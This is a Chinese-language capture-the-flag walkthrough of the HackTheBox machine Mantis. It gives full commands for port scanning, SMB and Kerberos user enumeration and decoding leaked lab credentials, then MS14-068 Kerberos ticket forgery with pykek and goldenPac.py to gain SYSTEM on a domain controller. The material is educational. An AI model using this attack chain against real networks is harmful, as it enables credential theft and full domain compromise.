Mantis是一个困难的靶机，知识点涉及多种进制解码、SQL
server数据库、smb利用、黄金票据、ms14-068提权等。感兴趣的同学可以在HackTheBox中进行学习。

![截屏2021-10-26
下午3.31.40](https://image.3001.net/images/20220420/1650470065_62602cb10c5118bf17ad4.png!small)  
 _通关思维导图_  
![Mantis](https://image.3001.net/images/20220420/1650470067_62602cb38b453d127d48e.png!small)

## 0x01 侦查

### 端口探测

首先通过nmap对目标进行端口扫描

    
    
    nmap -Pn -p- -sV -sC -A 10.10.10.52 -oA nmap_Mantis
    

![截屏2021-10-26
下午4.28.34](https://image.3001.net/images/20220420/1650470069_62602cb5afae6b9e82e21.png!small)  
![截屏2021-10-26
下午4.29.20](https://image.3001.net/images/20220420/1650470073_62602cb97236b919ed016.png!small)  
![截屏2021-10-26
下午4.29.32](https://image.3001.net/images/20220420/1650470076_62602cbca2a7e0a94c75d.png!small)  
扫描结果显示目标开放了88、135、445、1433、1337、8080等多个端口

#### 1337端口

访问后发现这是 IIS 7 的默认界面  
![截屏2021-10-26
下午4.35.16](https://image.3001.net/images/20220420/1650470079_62602cbf492973cb24697.png!small)

尝试对目标进行目录扫描，结果显示存在目录`/secure_notes`

    
    
    gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    

![截屏2021-10-27
下午2.07.45](https://image.3001.net/images/20220420/1650470081_62602cc1abd093ba0b58c.png!small)

#### 8080端口

访问后发现这是一个博客站点  
![截屏2021-10-26
下午4.35.37](https://image.3001.net/images/20220420/1650470084_62602cc49ae9afc15c120.png!small)

尝试对目标进行目录扫描，扫描结果显示存在目录`/admin`

    
    
    gobuster dir -u http://10.10.10.52:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    

![截屏2021-10-27
下午2.34.17](https://image.3001.net/images/20220420/1650470086_62602cc648dce7667bb21.png!small)

访问该目录发现这是管理员登陆窗口，尝试使用弱口令爆破，但未发现可用账号密码  
![截屏2021-10-27
下午2.35.29](https://image.3001.net/images/20220420/1650470089_62602cc92a59e971c6aba.png!small)

#### 445端口

使用 smbmap 和 smbclient 测试 smb 服务，结果显示我们虽然能够通过 smb 匿名登录进行访问，但是其目录中不存在多余的文件。

    
    
    smbmap -H 10.10.10.52
    smbclient -N -L //10.10.10.52
    

![截屏2021-10-27
下午2.16.37](https://image.3001.net/images/20220420/1650470090_62602cca348b0e25391de.png!small)

使用 rpcclient 尝试连接，虽然能够连接但是仍然提示拒绝进入

    
    
    rpcclient -U '' -N 10.10.10.52
    rpc > querydispinfo
    rpc > enumdomusers
    

![截屏2021-10-27
下午2.19.50](https://image.3001.net/images/20220420/1650470091_62602ccb4e62d8d437075.png!small)

#### 88端口

使用 kerbrute 在当前域`htb.local`中爆破 kerberos 用户。kerbrute 默认在 kali 中未安装，我们可在 github
中进行下载获得并赋予执行权限

 **下载地址：https://github.com/ropnop/kerbrute/releases/tag/v1.0.3**

    
    
    ./kerbrute userenum --domain htb.local /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.52
    

![截屏2021-10-27
下午3.52.21](https://image.3001.net/images/20220420/1650470092_62602ccc55260c966bb25.png!small)

成功发现存在三个用户名，使用 impackets 中的 GetNPUser.py 检测具有“不需要 Kerberos
预认证“属性的用户，但不幸的是这几个用户都没有该属性

    
    
    cp /usr/share/doc/python3-impacket/examples/GetNPUsers.py . 
    for user in $(cat users); do python3 GetNPUsers.py htb.local/${user} -no-pass -dc-ip 10.10.10.52 2>/dev/null | grep -F -e '[+]' -e '[-]';done
    

![截屏2021-10-27
下午2.56.31](https://image.3001.net/images/20220420/1650470093_62602ccda42b118a70cab.png!small)

### 密码信息泄漏

访问目录`/secure_notes`，虽然我们无法查看`web.config`，但是可访问`dev_notes_xxx.txt`  
![截屏2021-10-27
下午3.35.01](https://image.3001.net/images/20220420/1650470094_62602cceb6b0adcdf1730.png!small)

其中包含了搭建 OrchardCMS 的相关步骤，如下载 SQL server 数据库、创建对应数据库和管理员等  
![截屏2021-10-27
下午3.35.20](https://image.3001.net/images/20220420/1650470095_62602ccfb05d5a444ea0c.png!small)

除了以上信息，在底部我们还发现一串二进制代码，通过提示可知 OrchardCMS 将这串二进制作为 admin 用户的凭证，而SQL server
管理员用户 sa 的凭证则是文件名  
![截屏2021-10-27
下午3.37.04](https://image.3001.net/images/20220420/1650470096_62602cd088f69370decf8.png!small)

#### OrchardCMS密码

首先使用 perl 和 shell 脚本将该二进制代码成功解码，密码为`@dm!n_P@ssW0rd!`

    
    
    perl -lpe '$_=pack"B*",$_' < <(echo 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001)
    

![截屏2021-10-27
下午3.42.56](https://image.3001.net/images/20220420/1650470097_62602cd13e628f199280e.png!small)

#### SQLserver密码

将 txt 文件名中的密文进行 base64 解码，结果显示其中所有两位十六进制值似乎都属于ASCII码范围

    
    
    echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d
    

![截屏2021-10-27
下午3.45.32](https://image.3001.net/images/20220420/1650470097_62602cd1ed504a92408c4.png!small)

尝试使用 xxd 来解码 base64 转换后的十六进制字符，成功拿到密码为`m$$ql_S@_P@ssW0rd!`

    
    
    echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p
    

![截屏2021-10-27
下午3.48.43](https://image.3001.net/images/20220420/1650470098_62602cd2d12a077488597.png!small)

## 0x02 上线[james]

### SQLserver数据库登录

使用默认数据库管理员`sa/m$$ql_S@_P@ssW0rd!`进行数据库登录，但登录失败

    
    
    cp /root/Desktop/impacket/examples/mssqlclient.py . 
    python3 mssqlclient.py 'sa:m$$ql_S@_P@ssW0rd!@10.10.10.52'
    

![截屏2021-10-27
下午3.59.04](https://image.3001.net/images/20220420/1650470099_62602cd37e68f90c01987.png!small)

切换至 OrchardCMS 的管理员用户 admin 后登陆成功

    
    
    python3 mssqlclient.py 'admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'
    

![截屏2021-10-27
下午3.59.20](https://image.3001.net/images/20220420/1650470100_62602cd467f75bfacf1c1.png!small)

为了更直观地看到数据库中的信息，我们使用 dbeaver 进行查看  
![截屏2021-10-27
下午4.01.54](https://image.3001.net/images/20220420/1650470101_62602cd57dfb38bf50097.png!small)  
![截屏2021-10-27
下午4.02.27](https://image.3001.net/images/20220420/1650470102_62602cd68b844e1f52c30.png!small)

但是点击测试后出现以下报错信息，查询谷歌后可知：我们需要修改`java.security`文件  
![截屏2021-10-27
下午4.12.58](https://image.3001.net/images/20220420/1650470103_62602cd76f1df5de3da62.png!small)

通过命令 locate 定位该文件

    
    
    locate java.security
    

![截屏2021-10-27
下午4.17.35](https://image.3001.net/images/20220420/1650470104_62602cd85a1411dceff1c.png!small)

在其中寻找`jdk.tls.disabledAlgorithms`并修改如下

    
    
    jdk.tls.disabledAlgorithms=SSLv3, RC4, DES, MD5withRSA, \
        DH keySize < 1024, EC keySize < 224, 3DES_EDE_CBC, anon, NULL, \
        include jdk.disabled.namedCurves
    

![截屏2021-10-27
下午4.17.25](https://image.3001.net/images/20220420/1650470105_62602cd9523bf77b12577.png!small)

重连数据库成功，开始寻找数据库中的有用的信息  
![截屏2021-10-27
下午4.25.26](https://image.3001.net/images/20220420/1650470106_62602cda1b00612c790f1.png!small)

在`orcharddb/Schemas/dbo/Tables/blog_Orchard_Users_UserPartRecord`下找到一个账号密码`James/J@m3s_P@ssW0rd!`，电子邮件为`james@htb.local`，可能是系统用户  
![截屏2021-10-27
下午4.33.04](https://image.3001.net/images/20220420/1650470107_62602cdb28a0e82c4e0c7.png!small)

### smb登陆

使用 crackmapexec 检测以上账号密码是否可登陆系统的 smb 服务，结果显示登陆成功

    
    
    crackmapexec smb 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
    

![截屏2021-10-27
下午4.36.11](https://image.3001.net/images/20220420/1650470108_62602cdc3e83f7f6d89c7.png!small)

使用 smbmap 测试 smb 共享，能够读目录`SYSVOL`、`NETLOGON`

    
    
    smbmap -H 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
    

![截屏2021-10-27
下午4.37.58](https://image.3001.net/images/20220420/1650470110_62602cde016ea4989a8e1.png!small)

使用 rpcclient 连接并查看当前所有用户

    
    
    rpcclient -U htb.local/james 10.10.10.52
    rpc > enumdomusers
    

![截屏2021-10-27
下午4.39.50](https://image.3001.net/images/20220420/1650470111_62602cdf1dc48fcda1cb1.png!small)

通过 james 身份查看 kerberos 信息，但是未返回信息

    
    
    python3 GetNPUsers.py 'htb.local/james:J@m3s_P@ssW0rd!' -dc-ip 10.10.10.52
    

![截屏2021-10-27
下午4.41.06](https://image.3001.net/images/20220420/1650470112_62602ce05b01208fc1ca6.png!small)

## 0x03 权限提升[system]

### 地址解析

首先修改本地 hosts 文件完成域名解析

    
    
    vim /etc/hosts
    # 配置
    10.10.10.52 mantis.htb.local mantis
    10.10.10.52 htb.local
    

### ms14-068提权

ms14-068漏洞产生的原因是普通用户向kerberos密钥分发中心（KDC）申请TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的
Kerberos
票据。如果票据声明自己有域管理员权限，而KDC在处理该票据时未验证票据的签名，那么返回给用户的TGT就使普通域用户拥有了域管理员权限。该用户可以将TGT发送给KDC，KDC的TGS（票据授权服务）在验证了TGT后，将服务票据（Server
Ticket）发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。利用条件也非常简单，我们只需要拥有任意域用户的用户名、SID、密码即可获取域管理员权限。

 **参考文章：https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html**

首先安装 kerberos 软件

    
    
    apt-get install krb5-user cifs-utils rdate
    

修改DNS配置

    
    
    vim /etc/resolv.conf
    # 配置
    nameserver 10.10.10.52
    

在`krb5.conf`中修改 kerberos 域的相关信息

    
    
    vim /etc/krb5.conf
    # 配置
    [libdefaults]
    	default_realm = HTB.LOCAL
    
    # The following krb5.conf variables are only for MIT Kerberos.
    	kdc_timesync = 1
    	ccache_type = 4
    	forwardable = true
    	proxiable = true
    
    [realms]
        HTB.LOCAL = {
    	   kdc = mantis.htb.local:88
    	   admin_server = mantis.htb.local
    	   default_domain = HTB.LOCAL 
    	}
    [domain_realm]
    	.domain.internal = HTB.LOCAL
    	domain.internal = HTB.LOCAL
    

与域控制器同步时间

    
    
    rdate -n 10.10.10.52
    

![截屏2021-10-28
上午10.35.23](https://image.3001.net/images/20220420/1650470113_62602ce182d4961a43013.png!small)

使用 kinit 生成 james 用户票据

 **需要注意的是需要将域名改成大写，否则会报错**

    
    
    kinit -V james@htb.local
    

![截屏2021-10-28
上午10.06.07](https://image.3001.net/images/20220420/1650470114_62602ce2a0572d3ff7527.png!small)

将域名大写后票据生成成功，接下来需要将该用户票据锻造成黄金票据

    
    
    kinit -V james@HTB.LOCAL
    klist
    

![截屏2021-10-28
上午10.38.20](https://image.3001.net/images/20220420/1650470115_62602ce3be0e80f642cd5.png!small)

使用 rpcclient 获取当前用户的 SID

    
    
    rpcclient -U james 10.10.10.52
    rpc > lookupnames james
    

![截屏2021-10-28
上午10.02.34](https://image.3001.net/images/20220420/1650470117_62602ce58b7d2d2976e84.png!small)

使用工具 pykek 来生成黄金票据

    
    
    git clone https://github.com/mubix/pykek && cd pykek
    python2 ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local
    

![截屏2021-10-28
上午10.46.48](https://image.3001.net/images/20220420/1650470118_62602ce69dfea6a553d3d.png!small)

成功生成后将其复制到票据使用的位置

    
    
    cp TGT_james@htb.local.ccache /tmp/krb5cc_0
    

![截屏2021-10-28
上午10.48.21](https://image.3001.net/images/20220420/1650470119_62602ce7c9eeb3852e44e.png!small)

再次连接 smb 服务可直接下载并查看其中的`root.txt`

    
    
    smbclient -k -U james \\\\mantis.htb.local\\C$
    smb > get Users\administrator\desktop\root.txt
    

![截屏2021-10-28
上午11.15.51](https://image.3001.net/images/20220420/1650470121_62602ce937a2ee4dc2ff9.png!small)  
![截屏2021-10-28
上午11.16.39](https://image.3001.net/images/20220420/1650470122_62602cea0f19973fedc78.png!small)

使用 impacket 中的 goldenPac.py 可直接获取系统权限

    
    
    python3 goldenPac.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local
    

![截屏2021-10-28
上午9.52.07](https://image.3001.net/images/20220420/1650470123_62602ceb0c35c14b487e4.png!small)

在用户 james 和管理员桌面上寻找flag

    
    
    dir c:\Users\james\Desktop
    type c:\Users\james\Desktop\user.txt
    dir c:\Users\Administrator\Desktop
    type c:\Users\Administrator\Desktop\root.txt
    

![截屏2021-10-28
上午9.56.32](https://image.3001.net/images/20220420/1650470124_62602cec7328bd29153d6.png!small)  
![截屏2021-10-28
上午9.57.43](https://image.3001.net/images/20220420/1650470125_62602cedbc7058f87dcdb.png!small)  
成功获取两个flag

**总结：该靶机中存在多个端口，完成对这些端口的探测后发现1337端口的HTTP服务中存在密码信息泄漏，将密码解后可成功获取数据库和OrachardCMS的密码明文。使用CMS的账号密码可成功登陆数据库，在其中找到系统域用户的账号密码，验证该账号密码可成功登陆smb服务，既然该用户是域用户，我们可以借助ms14-068漏洞生成黄金票据并最终成功拿到系统权限。**

